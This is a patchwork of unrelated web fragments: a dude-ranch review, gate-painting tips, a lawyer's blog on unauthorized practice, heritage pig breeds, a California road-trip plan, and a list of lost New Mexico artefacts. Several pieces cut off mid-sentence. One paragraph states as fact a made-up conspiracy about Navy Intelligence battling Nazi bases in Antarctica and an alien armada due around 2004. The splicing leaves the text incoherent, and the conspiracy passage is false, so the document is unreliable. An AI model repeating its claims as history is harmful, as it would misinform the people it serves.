&#xa0;With a blazing fire of mesquite logs, a cowboy playing the guitar (wait&#x2013;don&#x2019;t I recognize our naturalist from the Nature Walk singing as he strums?) and a black bowl of stars overhead, you couldn&#x2019;t ask for anything more. &#xa0;Except maybe another cold beer and another helping of those luscious ribs. Do you think cowboys ever had barbecued portobello mushrooms? Frankly, I don&#x2019;t care. It seems fitting that a cowhand like me, who refuses to saddle up, should have portobello mushrooms for a dinner cookout, and baked Alaska for brunch the next day. Doesn&#x2019;t it?</p>   <p><em>Rancho de los Caballeros hosted our visit, including two nights and 7 meals, my jeep ride and spa treatment. We were in a Maricopa suite, the priciest of the rooms at the ranch, with large separate living room and a small kitchen. &#xa0;We were impressed with the immaculate upkeep inside and out and the enthusiastic young staff . The food was well above average. Guests pay for the luxury. Room rates (including 3 meals) range from $400 to $650 per day for two people depending on room and season. Activities, including riding, are extra. The ranch is open October through May. You can follow them on Facebook and find them on Twitter, where they are @RanchodelosCab.</em></p>   <p> Do you ride horses? Have you ever vacationed at a dude ranch?

   <div>   <p>Wrought iron gates are beautiful as they are usually painted in at least two colours, with the colours intertwining to reveal threads of gold or silver amidst another bold colour. If you just look around on a site like , you will concur.&#xa0;However, just like any other object exposed to rain and shine, wrought iron gates are not spared from the elements. Whenever your gate has faded, here is how you can paint it yourself:</p>   <p>1. Remove rust</p>   <p>Before you start painting, you&#x2019;ll need to remove any rust from the gate to ensure a smooth finishing. Use a wire brush or a scraper to remove rust from the gate.</p>   <p>2.&#xa0; Remove old paint</p>   <p>Without removing the existing paint, the new paint will not hold well onto the surface as well as cause unevenness. Use sandpaper of medium coarseness to remove all the chipped or peeling paint.</p>   <p>3. Wipe the gate</p>   <p>Use a dry rag to wipe the gate clean of any rust and paint debris. Alternatively, you may also use a soft brush as long as no dust accumulates on your gate.</p>   <p>4. Protect nearby items</p>   <p>Any paint job will be a messy one regardless how careful you are. Cover nearby objects, even plants, with cloth or newspapers. You may want to tape the newspapers in place bearing in mind that wind will displace the newspapers. If you are covering your plants, dampen them with a list mist of water before doing so.</p>   <p>5. Apply a coat of primer</p>   <p>Now that you are ready to start the painting works, first apply a coat of primer. This primer serves as an undercoat to minimize the rusting of the gate. Primers are available in two forms &#x2013; liquid and in aerosol cans. If there are intricate patterns on your gate, the aerosol would be more convenient or else you would find yourself wrestling with the paint brush in hard-to-reach areas. Make sure that you stir the primer well if you are using the liquid form, or shake the aerosol can well.</p>   <p>6. Let the primer dry</p>   <p>Primers usually take 1 to 3 hours to dry completely. This time may differ depending on the weather. The primer must dry completely before you start painting the gate for the best results.</p>   <p>7. Paint the gate</p>   <p>For wrought iron, use rust-inhibitive enamel paint meant for steel or metal. Using the wrong paint will cause the paint to not adhere to the surface well. Again, choose the most convenient form of paint suitable with the designs on your gate. If you are using aerosol paint, hold the can about 3-4 inches away from the gate so prevent too much paint from being sprayed and subsequently dripping and causing dried &#x2018;bumps&#x2019; of paint on your gate.</p>  </div>

   <div>   <p>In the Empire State, we refer to lawyers who are authorized to practice law as &#x201c;admitted.&#x201d;&#xa0; Whenever someone used the word &#x201c;barred,&#x201d; my mind immediately envisions an <b>iron</b> gate making it impossible to get through.&#xa0; As in, <em>the lawyer was barred from any public place where pleasant people congregate</em>.In other locales, the word &#x201c;barred&#x201d; means that a person is admitted to the bar.&#xa0;Weird locales to a New York lawyer&#x2019;s ear.But what makes it even weirder is when the lawyer refers to those locales as the places where they find and represent clients, even though they are neither admitted nor barred.&#xa0; That&#x2019;s because lawyers, whether you like it or not, are only authorized to be lawyers in places where they have been barred. Or admitted, if you come from a place where people don&#x2019;t talk funny.This is a fairly fundamental aspect to being a lawyer.&#xa0; Just as a cop is only a cop in the geographical area of his employment, authorized by law to make split-second decisions that elsewhere would assure him a murder charge, a lawyer can only practice law where the sanctioning authority says he can. Practicing law in places where a lawyer is unauthorized is a pretty clear wrong, much like raiding an escrow account because that new car is calling your name.&#xa0; Even the ABA, in rule 5.5, admits as much, and they are certainly the last carry the torch of arcane ethical rules.One would think that the disciplinary authority of jurisdictions where a person engaged in the unauthorized practice of law would take something so obvious pretty seriously.&#xa0; After all, if they don&#x2019;t keep a lid on who gets to hang around their jurisdiction claiming to be a lawyer, then what&#x2019;s to stop anybody from doing so?&#xa0; And if anybody can do so, then the public would be deceived and led to seek legal advice from people of dubious competence and devoid of ethics, and the bar associations wouldn&#x2019;t get their dues paid. It would be a disaster all around.Which led me to ponder the significance of this&#xa0; . </p>   <blockquote>    She is barred to practice law in New York and New Jersey&#x2013;but she lives in South Dakota with her husband and one year-old daughter. She services clients living everywhere from Bangladesh and Costa Rica to California and Florida.   </blockquote>Nobody is &#x201c;barred&#x201d; in New York and New Jersey, where local custom is to call it &#x201c;admitted,&#x201d; the first give-away that something is amiss.&#xa0; The rules of admission, the lawfulness of practicing law if you will, do not seem to strike home here. To add to the issue, New Jersey has rather stringent physical office requirements.&#xa0;A quick click on the New Jersey lawyer registration records puts this lawyer in Phoenix, Arizona, which isn&#x2019;t too often confused with Fargo. The notion of authorization to practice law being limited by geography is very old school to new lawyers.&#xa0; Even the&#xa0; &#xa0;thinks it&#x2019;s time to scrap it, if only to reduce lawyers fees by making lawyers compete nationwide.&#xa0; I&#x2019;m disinclined to go with the convenient flow on this one, until someone comes up with a way to make lawyers sufficiently competent in the law and procedure of 51 jurisdictions to safeguard clients.&#xa0; Of course, if the lawyer is sufficiently superficial, then the differences between jurisdictions don&#x2019;t really matter that much; they are relatively incompetent in all jurisdictions, making the unauthorized practice of law the least of the problems. The rationale for eschewing such archaic rules as this is two-fold. First, that the internet has changed everything, by making it easy for anyone to promote themselves online to people anywhere and everywhere, and shouldn&#x2019;t a person be entitled to take money from anyone willing to give it? The second is that old lawyers, the ones who think there is some merit in ethical rules for lawyers, tend to hate anything new and anyone who has found a better way.&#xa0; We fear the new, as the young will steal our business by being smarter, cuter, cooler and more cutting edge.&#xa0; Ethics rules exist to keep them down, to oppress them and prevent them from seizing upon new ideas, new technologies that take away our edge of experience and shift the mojo.&#xa0; We must hate them for ruining our perfect lawyer world. It strikes me that while their rationale is silly, as what the post describes as a &#x201c;successful practice&#x201d; wouldn&#x2019;t be sufficient to support my addiction to three regular meals, there is a point to their cutting edge efforts. If it&#x2019;s cool with the disciplinary authorities in New York, New Jersey, South Dakota, California, Florida and Costa Rica (assuming they have anything remotely similar to what we have), then why shouldn&#x2019;t this lawyer be able to engage in the unauthorized practice of law? Either it&#x2019;s a good rule, in which case the sanctioning bodies need to enforce it, or it&#x2019;s not, in which case they ought to cross it off the books.&#xa0; But as long as it remains a basic rule of being a lawyer, some of us will adhere to it because we feel compelled to honor our ethical requirements.&#xa0; So which is it, guys?&#xa0; Am I barred from representing folks any damn place I want or not?&#xa0; If things like the unauthorized practice of law are too old school to bother with, let&#x2019;s clear this up and quell the commotion. Either way, get off your tired old butts and deal with this.   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>

These were naturally thrifty, hardy animals raised for their meat, bacon and lard. The food chain worked beautifully for all concerned, the pigs lived off the land, on grass, grains and windfalls, and occasionally whey from the churn.          </div>         </div>        </div>       </div>      </div>       <div>       <h5>Learn More</h5>       <div>        <div>         Unfortunately, heritage pork breeds are not suited for the intensive farming techniques being used nowadays, and some of the older breeds are in danger of being lost forever. Fortunately some are being preserved by a few dedicated farmers concerned about the general indifference of the consumer towards heritage breed conservation.        </div>        <div>         All heritage pork in America comes from pure and cross-bred livestock:        </div>        <div>         <strong>The Berkshire:</strong> a first class black pig with excellent lean meat. Occasionally, when commercial white pork becomes too bland and tasteless, some Berkshire genes are used to improve it.        </div>        <div>         <strong>The Tamworth:</strong> a red heritage breed producing the best bacon in the U.S., a direct descendant of the wild boars which roamed the forests of Staffordshire. This breed was introduced to North America around the 1870&#x2019;s.        </div>        <div>         <strong>The Red Wattle:</strong> This one&#x2019;s really in danger of extinction, it has dark, lean tender meat. It originally came to New Orleans via New Caledonia and developed in Texas. He went out of fashion when people wanted pigs for lard.        </div>        <div>         <strong>The Duroc:</strong> Its genes appear in many modern breeds. This is one of the juiciest and tastiest breed of pig.        </div>        <div>         <strong>The Gloucester Old Spot:</strong> a.k.a. The         <b>Iron</b> Age Pig, this breed is a cross between the domestic and wild pig. Excellent meat, at one point there were great numbers in the U.S.        </div>        <div>         <strong>The Yorkshire:</strong> They originated in Yorkshire England, home of the famed All Creatures Great and Small stories. Yorkshires do very well on pasture and are excellent mothers weaning large numbers of piglets. They are a foundation breed crossed with other breeds to create modern commercial pig gene tics.        </div>        <div>         <strong>The Large Black:</strong> A pasturing pig, small shoulders but very tasty lean hams. There are fewer than 200 in the U.S. The idea is preserving heritage breeds by consuming them. It is dangerous to have only a handful of commercial livestock breeds which have all the same traits. A new illness, or a radical change in the world&#x2019;s climate, could wipe them out in no time without enough variation in the genetic pool available for them to recover. Modern industrial breeds are weak in the sense that they now have genetic defects due to excessive, unnatural inbreeding.        </div>       </div>       </div>      </div>      <div>      <div>       <div>        <h4>News on the Farm</h4>        <ul>         <li> <span>March 20, 2016</span> </li>         <li> <span>March 2, 2016</span> </li>         <li> <span>June 22, 2015</span> </li>         <li> <span>May 4, 2015</span> </li>         <li> <span>June 25, 2014</span> </li>        </ul>       </div>        <div>        <h4>Living Green</h4>        <div>         At White         <b>Gates</b> Farm, we believe in reducing our carbon footprint.

As in WWI, WWII, ; and the current intelligence war between the anti-Grey COM-12/CABAL forces of Navy Intelligence and the pro-Grey <strong>MAJI/AQUARIUS</strong> forces backed by Nazi [NSA] Intelligence, Navy Intelligence once again battled<strong> &#x201c;Nazi&#x201d; </strong>Intelligence during Operation Highjump in the 1950&#x2019;s under the command of Navy and 4000 elite Navy troops under the cover of a &#x201c;scientific expedition&#x201d; with a massive military armada which made an all-out assault on the Nazi Antarctica battalions. The conflict ended in a stalemate, with losses on both sides. The New Berlin base &#x2013; like the Dulce New Mexico facility and the Pine Gap Australia facility &#x2013; is tied-in with an alliance of regressive alien forces: the Dracos of Alpha Draconis, Greys of Rigel Orion, and Aryan/Ashtar forces of Sirius-B based within the massive Kamagol-II facility under Gizeh Egypt, who are in turn allied with more of their kind within 3 &#x201c;asteroid-ships&#x201d; which came into the system, hiding in comet Hale-Bopp&#x2019;s tail, and &#x201c;jumped ship&#x201d; as the comet rounded the sun taking up orbits around Mercury&#x2026; also joint Bavarian/Alien Alt3 facilities on Luna &amp; Mars&#x2026; and also a vast Draconian &#x2013; Rigelian &#x2013; Sirius-B armada which is now en-route to planet earth and due to arrive around 2004 to help enforce the New World Order, which they intend to annex to the central Draco empire on Typhon [Alpha Draconis], in that the &#x201c;Fourth Reich&#x201d; [Antarcticans] have been told that they will be given 25 percent of the planet for their part in selling us out.

Then a gold prospector named Renn vanished and could not be found by police teams who combed the area for weeks. Harry Owens, a station owner from Oakley Creek, disappeared at the mountain while searching for stray cattle, as did his parter George Hawkins who went to search for him after alerting police. Two police trackers entered the caves but only one came out, and he was so shaken by an experience that terrified him so much that he could give no clear account of what happened. One man armed with a revolver and electric torch penetrated the caves, one of which descended and narrowed, and deep within he encountered bats and a sickly, musty stench, then his torch went out.

   <div>   <p>In December 2013, we decided with some good friends to go on a road trip in California. I just wanted to share our roadmap from Los Angeles to Los Angeles accross .</p>   <h2>Preparations</h2>   <p>When planning a visit to California, make sure you reserve and schedule the following visits. These attractions are quitly fast filled-up and you don&#x2019;t want to miss anything?</p>   <ol>    <li>Alcatraz Island (National Park), San Francisco.</li>    <li>Hearst Castle, San Simeon.</li>    <li>Helicopter Flight, at the Grand Canyon.</li>   </ol>   <p>Plan to buy an annual pass for the National Parks. You can pick it up at the visitor center of a National Park Visitor Center and it costs approximately 80$. As we didn&#x2019;t want to be strapped to the schedule and wanted to have some flexibility, we decided only to reserve a sleeping spot on some key locations during our journey. However, a tent will be bought.. Just in case! Wondering about the gas price? No need to look further, everything can be found on this . Fyi: 1 gallon = 3,79 liter. Oh yes it is&#x2026; very cheap compared to the Belgian gas prices!</p>   <h2>Saturday August 16th, 2014</h2>   <p>Take-off is scheduled at 10:05 CEST in Brussels Airport. There is no direct-flight, so a little stop is required in Frankfurt. If we don&#x2019;t encounter any problems on the road, we should be arriving around 16:40 PDT. Before going to the hotel, we need to make a little stop to pick-up our car at the car rental service.</p>   <h2>Sunday August 17th, 2014</h2>   <p>After a very long day and probably a too short night of sleep, we are starting our adventure at Los Angeles. Our first day includes a visit to the local supermarket to gather some supplies such as some bottles of water, a flashlight, some toilet paper, an US map, etc. In the afternoon, we&#x2019;ll going to take a bit easy -we&#x2019;ll still be recovering from jetlag I presume- and visit Universal Studio&#x2019;s and perform a little stroll through Hollywood.</p>   <h2>Monday August 18th, 2014</h2>   <p>On the road to Phoenix, we are planning a stop at. First of all, we pass at the visitor center to buy an annual pass for all the National Parks in the States. Once done, we&#x2019;ll get our stuff and start with some hiking in the park. A nice know-it about Joshua Tree National Park is the fact it&#x2019;s pretty much the same size of . In fact it&#x2019;s still approximately 55 square kilometers larger than West-Vlaanderen (3.144 km2). The park is know for his two different parts of dessert (the higher and the lower . The name of the park is derived from . The park includes some hiking trails, camping spots and a guided drive tour which requires an all-terrain car.</p>   <h2>Tuesday August 19th, 2014</h2>   <p>In the morning we will be travelling towards Phoenix with a regular stop to enjoy the view of the landscape. Some research on the internet led us to in the state of Arizona. Shooter&#x2019;s world provides the ability to rent guns on an hourly-basis and test them out on the shooting range. After having some fun at the gun range we will continue our trip in the direction of Flagstaff (Grand Canyon).</p>   <h2>Wednesday August 20th, 2014 &amp; Thursday August 21th, 2014</h2>   <p>Today we&#x2019;ll be visiting one of nature&#x2019;s finest locations: the Grand Canyon. Carved by the Colorado river, the Grand Canyon reaches a total distance of 446 kilometers and attains a depth of 1.800 meters at certain places. The national park exists out-of 3 main locations: , &amp; . As these locations (driving distance between north and south is approximately 344 kilometers) are a bit out of range of eachother, we decided only to visit two of them. A visit to the SkyWalk will be postponed to a later day as an addendum to the Hoover Dam. Please note a visit to Grand Canyon is included in your annual pass, however an additional fee of 15$ per verhicle is in place. Once payed, it can be re-used in a 7-day range for both the North -, as the South rim.</p>   <h2>Friday August 22th, 2014</h2>   <p>We continue our trip towards &#xa0;with a short stop at . They told us there isn&#x2019;t that much to do over there, besides sightseeing at the rim. So basically, today is a day we will spend a lot of our time in the car driving in the direction (480 kilometers) of our next-stop.</p>   <h2>Saturday August 23rd, 2014</h2>   <p>Today is one of my personal favorites of the road trip. The drive through the of so many Western movies: &#x201c;Monument Valley&#x201d;. We will tend to get a sleeping spot over here, as they told us the sunset can be extremely beautiful.</p>   <h2>Sunday August 24th, 2014</h2>   <p>Starting to work our way back down to Las Vegas. Our first stop in this trip is . Depending on the weather, we can take the rest of the day off and spend some time at the . On other option could be to navigate to Antelope Canyon and create another buffer day.</p>   <h2>Monday August 25th, 2014</h2>   <p>Today&#x2019;s visit? and . Antelope Canyon consist out of two smaller canyons marked with a very specific structure and texture. The two canyons are named &#xa0;the Lower &#x2013; and the Upper Antelope Canyon. The park is not managed by the National Park Service, instead it&#x2019;s managed by the . It means you can&#x2019;t use the annual pass and you need to pay something between 30$ to 80$ for a guided tour per person. As a second part, we&#x2019;ll drop by . Also here an additional fee of 25$ needs to be payed. If it seems really interesting, we can opt to do some hiking on our buffer day of the 27th of August.</p>   <h2>Tuesday August 26th, 2014</h2>   <p>Bryce Canyon! Some people say is more impressing than the Grand Canyon. And if you see the pictures about the landscape, the view and the odd structure of the rocks.. I tend to believe they have a good reason. The area was settled by Mormon People and is named after Ebenezer Bryce, who homesteaded here during the 1870ties.</p>   <h2>Wednesday August 27th, 2014</h2>   <p>After strollin&#x2019; 10 days, we opted to plan a buffer day before heading to Las Vegas. Basically, we don&#x2019;t know what we are going to do with this day. There is a rather large chance, it will be a take-it-easy day.. If we wan&#x2019;t we can still visit one of the last parks to do some hiking.</p>   <h2><strong>Thursday August 28th, 2014</strong></h2>   <p>, the city that never sleeps. First up.. Walking The Strip, catch some of the spirit living in the casino&#x2019;s of world&#x2019;s most-known gambling city in the middle of the desert of Nevada!</p>   <h2>Friday August 29th, 2014</h2>   <p>We tend to leave on-time as we have a busy day ahead of us. First stop, the&#xa0;and additionally the Grand Canyon Skywalk. The Hoover Dam has been constructed in 1931-1936 by thousands of blue-colour workers. During the construction, hunderds of workers lost their life. Some people say, we will never know the exact number. The dam has been named after (31st President of the United States). The construction has been completed in the term of (32nd president of the United States).&#xa0;Did you know the rivers originating from the Grand Canyon are the ones filling up the lake which is the border between Nevada and Arizona? Second stop of the day is the Grand Canyon Skywalk which is on approximately 2 hours of driving distance. The skywalk is a construction made of <b>iron</b> and glass that hangs over the rim giving you an .</p>   <h2>Saturday August 30th, 2014</h2>   <p>Next large city on the list: San Francisco! First stop on the route: Death Valley! Located in the Mojave Desert is known by most people for the extreme conditions. Death Valley is the lowest, hottest and driest place in North America. Maximum temperature ever measured is 56.7&#xb0;C. Another reason why people know Death Valley is for his different , and the lack of flora.</p>   <h2>Sunday August 31st, 2014</h2>   <p>And.. again a day we will spend most of our time in the car. Distance to our next stop is approximately 550km and takes about 6 hours. Maybe we should use some of our time remaining from the day, to do some washes in a launderette.</p>   <h2>Monday September 1st, 2014</h2>   <p>&#x201c;A land of Giants&#x201d;. One of the must have seen locations is &#xa0;/ Sequoia National Forest. The Sequoia tree is known for their extreme size and red colour. The largest tree within the park is the tree with a total height of almost 84 meters, a diameter -at the bottom- of more than 11 meter and an estimated age of 2.200 years. Therefore the Sequoia tree is also referred as the Mammoth Tree. The most famous trees to be found in the park are: &#x201c;General Sherman&#x201d;, &#x201c;General Grant&#x201d;, &#x201c;Washington&#x201d;, &#x201c;President&#x201d; and the &#x201c;Lincoln&#x201d;.</p>   <h2>Tuesday September 2nd, 2014</h2>   <p> can also be visited within the same perimeter of the National Park. As the name indicates, the National Park is actually a Canyon with several rivers and lakes.</p>   <h2>Wednesday September 3rd, 2014 &amp; Thursday September 4th, 2014</h2>   <p>, the location of &#x201c;&#x201c;.. The big wall conquered by Tom Waes () during a 4-day climb in one the episodes of &#xa0;after 14 days of training.&#xa0;To be honest one of the better progams on Belgian National Television (another one is ).</p>   <p>Before anyone dares to ask, no we will not try to climb it&#x2026; We aren&#x2019;t nuts :-).</p>   <h2>Friday September 5th, 2014</h2>   <p>We are moving towards San Francisco and reserved a sleeping spot in San Francisco, we decided to plan a buffer day in case we want to spend some more time at one of the parks, do some laundry, enjoy the day, visit a nearby city, &#x2026;. I&#x2019;m quite sure we will find something to do!</p>   <h2>Saturday September 6th, 2014 to Monday 8th, 2014</h2>   <p>Riding the cable car in San Francisco, cycling the Golden Gate bridge, a little stroll in Chinatown, a slip over to Sausalito, a visit to Alcatraz, &#x2026; These are some of the things planned during these 3 days.</p>   <p>The main event is our visit to &#xa0;or &#x201c;&#x201d; as they call it. A good piece of advise? Get your tickets at least a few weeks in advance, as the free spots are quickly depleted. Buy them on the to avoid being scammed. The island &#x2013; characterized by the lighthouse and the federal penitentiary &#x2013; offers a view on the city of San Francisco. But not many people know prior to the federal penitentiary, the buildings were used as civil war fortress.</p>   <p>An another popular seeing sight is the Golden Gate Bridge, an icon for the city and is also used by as the company logo. I really hope we can see the bridge in it&#x2019;s full glory, they told me most of the year the bridge is limiting the view.</p>   <p>And last but not least.. a trip with the cable car. The hills of San Francisco are too steep to allow regular trams to be used. The cable car uses the cables too pull the car to a higher level. The cable car is only used on the steep hills, on the other routes regular trams are used (such as the ).</p>   <h2>Tuesday September 9th, 2014</h2>   <p>&#x201c;Three IT engineers on the loose&#x201d;. It&#x2019;s impossible for us to avoid Silicon Valley. A little visit to the following locations are appropriate:</p>   <ul>    <li>Facebook Headquarters (1601 Willow Road, Menlo Park);</li>    <li>Google Headquarters (1600 Amphitheatre Parkway, Mountain View);</li>    <li>Microsoft Headquarters (La Avenida Street, Mountain View);</li>    <li>Apple Headquarters (One Infinite Loop, Cupertino);</li>    <li>Intel Museum (2200 Mission College Blvd, Santa Clara).</li>   </ul>   <h2>Wednesday September 10th, 2014</h2>   <p>Driving Highway 1 from San Francisco towards San Diego. the state route is also named differently on various locations, such as Cabrillo Highway, Coast Highway, .. It starts somewhere around and ends near San Diego. During our trip we will pass where you can take guided tour to view whales, etc. You can visit&#xa0;, a historical mansion near San Simeon in Mediterranean Revival of the beginning of the 19ties to break your trip of approximately 7 hours in two.</p>   <h2>Thursday September 11th, 2014</h2>   <p>Basically our first day we didn&#x2019;t plan! The plan is to do nothing and enjoy the sun &#x2013; fingers crossed &#x2013; on the beach of Santa Monica. The beaches from Malibu to LA were the scenery of , a popular serie which was on air the 90ties.</p>   <h2>Friday September 12th, 2014 &amp; Saturday September 13th, 2014</h2>   <p>After a day doing nothing, we proceed towards San Diego. San Diego a city located next to the Mexican border. We planned &#xa0;a visit to the , a flight carrier of the American Army.&#xa0;Additionally we planned a visit to the Old Point Loma lighthouse, Fort Rosecrans Cemetry &amp; the San Diego Air &amp; Space Museum.</p>   <h2>Sunday September 14th, 2014</h2>   <p>On our road to our final destination and the location where our adventure started: Los Angeles..

Our flight takes of around 08:40 and makes a little detour to Washington before heading to Brussels Airport.

The report was written in French, and included the observations of a military expert who had visited New Mexico some time during the summer of 1817.    <span>Who wrote this report?</span> For more info, see   </div>   <div>    <strong>STATUE of&#xa0; SAN MIGUEL <span>Not yet found. </span></strong>In the&#xa0;church in the village of San Miguel near Mesilla, according to Arizona &#xa0;Bishop Henry Granjon, in 1902&#xa0;there was a statue of San Miguel imported from France. In 1883,&#xa0;the church burned and was rebuilt.&#xa0;The statue might have been moved to a museum in Texas but its precise location is unknown.   </div>   <div>    <p><strong>WHERE IS FRANCOIS MALLET&#x2019;S SHOTGUN? </strong><span>Not yet found.</span> In 1879, John B. Lamy Jr., nephew of Archbishop Lamy, shot and killed Fran&#xe7;ois Mallet, architect working of the cathedral, because he believed his fellow Frenchman was involved in a relationship with his wife. Mallet&#x2019;s estate included a double-barreled shotgun, which was given by Mallet&#x2019;s parents to Captain Louis Felsenthal, a hero of the Civil War in New Mexico. I am trying to locate this gun.</p>   </div>   <div>    <strong>WHO WAS LOUIS BOUCHER?</strong> The life of Louis Boucher (Louis de Bouchere) is elusive. Little is known of his beginnings, and nothing of his final years.&#xa0; He might have resided in Quebec in 1875, was a trail guide at Grand Canyon in 1891 and 1892, and was known as &#x201c;the Hermit&#x201d;. There was a Louis Boucher associated with the Sioux who married a daughter of Chief Spotted Tail (Chief of the Brules Sioux tribe) and niece of Crazy Horse, Chief of the Oglala Sioux tribe, and smuggled guns to the Sioux, but it is not certain that this is the same person. He left the Grand Canyon region in 1909 when the Santa Fe Railway interfered with the mining he had filed with the County. There are records of his grievances to the U.S. Forest Service, and of a visit to Albuquerque where he met District Forester Ringland in 1909. By way of New Mexico and Colorado, Louis journeyed to central Utah working in coal mines. He returned to Colorado only once, in 1912, and visited the Grandview Hotel at Grand Canyon.   </div>   <div>    <strong>WHAT HAPPENED TO CORSICAN PRIEST F.M.&#xa0; PAOLI? </strong>The Paoli family of Corsica is legendary. Pascal Paoli is the Corsican Jefferson, he helped draft the US Constitution, and several US towns bear his name. Rev. James de Fouri, in his Historical Skectch of the Catholic Church in New Mexico, wrote:    <em>&#x201c;In May 1867, Bishop Lamy was returning from France where he had been recruiting priests.&#xa0; He sailed from Le Havre &#x2026; accompanied by a cohort of young men, many of them were French: &#x2026; &#xa0;Father <strong>J.M.</strong>(sic)&#xa0;<strong> Paoli</strong>, a priest from the island of Corsica &#x2026;&#x201d;.</em>What happened to F.M. Paoli? I could not find his name in any record.   </div>   <div>    <strong>FRENCH WIFE OF&#xa0;DIEGO DIONISIO&#xa0;DE PENALOSA</strong>    <span>Not yet found.</span> In 1660, Diego Dionisio de Pe&#xf1;alosa had been appointed Spanish provincial governor of New Mexico.&#xa0; In the eyes of the Roman Catholic friars, his administration was treating too well the Pueblo Indians and their religious practices.&#xa0; Pe&#xf1;alosa was declared a heretic, had his property confiscated and was forced into exile in 1663. He ended up in France around 1673, and is said to have married a French wife.    <strong><span>Who was this lady?</span></strong> He died in France in 1687.   </div>   <div>    <strong> BISHOP LAMY&#x2019;S HAT </strong>    <span>Not yet Found.</span>   </div>   <div>    The hat was stolen a few years ago at Bishop&#x2019;s Lodge during a party.&#xa0; No questions asked if you find it.   </div>   <div>    <strong> NAPOLEON&#x2019;S PAINTING </strong>    <span>Not yet Found, but getting closer.</span>   </div>   <div>    This is a large painting of Napoleon which was acquired by retreating Confederates during the civil war in New Mexico. It was said to be for some time in San Miguel Church in Socorro. In 1887, it was hanging in the office of the El Paso newspaper,    <em>The Bullion</em>, then in 1899 it was no longer there. Historian Marc Simmons has the beginning of the story (but not the painting) which you can read at   </div>   <div>    <strong>GOLDEN BULLETS FROM FRANCOIS AUBRY </strong>    <span>Not yet found.</span>   </div>   <div>    In one of his diaries (entry of August 27, 1853), Fran&#xe7;ois-Xavier Aubry, &#x201c;the Skimmer of the Plains&#x201d; states that &#x201c;The Indians use gold bullets for their guns. They are of different sizes and each Indian has a pouch of them &#x2026; They proposed exchanging them for lead &#x2026;&#x201d;.   </div>   <div>    <strong><strong> PEDRO VIAL&#x2019;S ORIGINAL DIARY and MAP of 1787 </strong></strong>    <span>Not yet found.</span>   </div>   <div>    Pedro Vial (from Lyons, France), is considered to be the founder of the Santa Fe Trail. His diary was copied and survived to our times, but the original has never been found.   </div>   <div>    The map vanished in the 20th Century, below if a copy made around 1840.   </div>   <div>    Map image: Courtesy Barry Lawrence Ruderman Antique Maps &#x2013; RareMaps.com   </div>   <div>    <strong> SANTA FE CATHEDRAL&#x2019;S CORNER STONE <span>Not yet Found.</span></strong>   </div>   <div>    The corner-stone was laid in 1869. A casket buried with the stone&#xa0; contained the names of the President of the United States, General Grant, of the Governor of the Territory, and other Territorial officers, together with some coins of gold, silver and copper, and also some documents and newspapers. Three days afterwards someone stole the corner-stone, with its contents, and nothing has been heard of it since.   </div>   <div>    <strong> GARNIER CLOCK OF THE PARROQUIA <span>FOUND!</span></strong>   </div>   <div>    It is in the museum of the Archdiocese in Santa Fe. For a while, a large clock graced the center fa&#xe7;ade of the Parroquia. The clock was built in 1869 by the renowned French clockmaker house of Jean-Paul Garnier of Paris, France. There are fifty-six pieces by Garnier in the Louvre Museum in Paris where a gallery is named after him. There are many other famous Garnier clocks in the world, for instance on the Tour de l&#x2019;Horloge of the Gare de Lyon in Paris, the clock above the entry gate of the Court of Cassation also in Paris, and the Tour de l&#x2019;Horloge Dolmabah&#xe7;e in Istanbul. Reverend Pierre Eguillon donated eight-hundred dollars to buy and install the clock. The clock, however, never worked correctly in spite of attempts to fix it. The original clock face was stored in various places with its gears missing, and it is now (2015) in the museum of the Archdiocese in Santa Fe.A small uncertainty remains: the clock in the Archdiocese museum has a brown face, while the clock in old photographs is white. Upon close examination of the old photograph, it seems that the white clock might have rusted and/or have been repainted.   </div>   <div>    <strong>FRENCH GOODS FROM THE SANTA FE TRAIL <span>Not yet found.</span></strong>   </div>   <div>    Tin Cans: In 1859, Randolph B. Marcy, Captain U.S. Army published The Prairie Traveler as &#x201c;the best-selling handbook for American pioneers&#x201d;. This is a practical manual for safe travel across the prairies to the West. This book recommends canned vegetables from Chollet and Co. in Paris. Would anyone have saved some of these cans?   </div>   <div>    Cigars &amp; Cigarettes: Pierre Abraham Lorillard (1742-1776) emigrated from France to the US and founded a cigarette and cigar factory. Lorillard was a familiar brand on the Santa Fe Trail and in New Mexico. Lorillard (Greensboro, North Carolina) is America&#x2019;s oldest tobacco company with over $5 billion sales in the US (in 2010).   </div>   <div>    <strong> LETTERS FROM FRENCH PRIESTS AND OTHER FRENCH TO FAMILIES IN FRANCE </strong>    <span>Not yet found.</span>   </div>   <div>    There was a big pile of such letters on a priest&#x2019;s desk in France, but it seems that they were thrown away. More must remain in attics.    <strong> PELLO ETCHEVERRY&#x2019;S BELT BUCKLE AND OTHER BELONGINGS </strong>    <span>Not yet found.</span>   </div>   <div>    Pello Etcheverry (1875-1964) was born in the Basque region of France.&#xa0; He was awarded one of the first Bronze Cowboy Awards in recognition of the distinction he brought the livestock and ranching industry. He died in Lovington July 20, 1964 at age 89. There is an exhibit about him at the Lea County Cowboy Hall of Fame, Hobbs, New Mexico   </div>   <div>    <strong> FURNITURE AND TAPESTRIES OF FATHER FRANCOLON&#x2019;S MOTHER</strong>    <span>Not yet found.</span>   </div>   <div>    Father Jean-Baptiste Francolon (1854-1922 )&#xa0;arrived from France in 1878 at age 24 with his mother, as secretary to Bishop Lamy in Santa Fe. In 1892, he moved as a missionary priest to Manitou, Colorado,&#xa0; in hopes of restoring his failing health. His mother arrived in Manitou from New Mexico in July 1893, bringing four French-speaking servants, as well as furnishings, tapestries, oils, statuary, antique vestments and laces, and native artifacts, which were displayed in the gallery on the third level of what is now Miramont Castle. See story at   </div>   <div>    <strong>WHO KILLED CAPT. DUMAS PROVENCHER?</strong> He was shot on November 6, 1888 in San Rafael near Socorro while supervising the tally of the elections. A $500 reward was offered but the culprits were never found. It is believed that he was victim of a conspiracy from Santa Fe. Descendents of the murderers, through family oral history, probably have the answer.   </div>   <div>    <strong>BISHOP LAMY&#x2019;S UMBRELLA <span>Found!</span></strong>   </div>   <div>    It has an ivory handle with Lamy&#x2019;s name carved on it. The &#x201c;Fabrique de Parapluies Fran&#xe7;ois Fr&#xe8;res&#x201d;,&#xa0; established in 1882 ( ) has examined detailed photographs and confirmed that this umbrella was most likely engraved for Bishop Lamy personally. Call me to come, see and touch it.   </div>   <div>    <strong>LUCIEN BONAPARTE MAXWELL&#x2019;S PIANOS</strong>    <span>Not yet found.</span> Many leads but so far dead ends. It turns out that the piano&#xa0;at the Girls Camp in Cimarroncita, was made in 1878 (too late to belong to Maxwell),&#xa0; came from the St. James Hotel (owned by Frenchman Henri Lambert) but not from 